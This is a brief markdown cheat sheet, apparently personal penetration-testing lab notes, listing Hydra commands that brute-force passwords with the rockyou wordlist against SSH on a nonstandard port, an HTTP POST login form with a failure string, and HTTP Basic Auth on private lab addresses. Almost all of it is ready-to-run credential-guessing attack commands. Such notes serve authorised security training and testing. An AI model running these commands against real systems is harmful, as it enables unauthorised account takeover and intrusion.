#bruteforce #cracking 

### SSH

```bash
sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.205.201
```
**-L for userlist**
**-s for port** 
#### WEB POST

```bash
sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

#### HTTP Basic Auth

```bash
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.221.201 -s 80 http-get
```

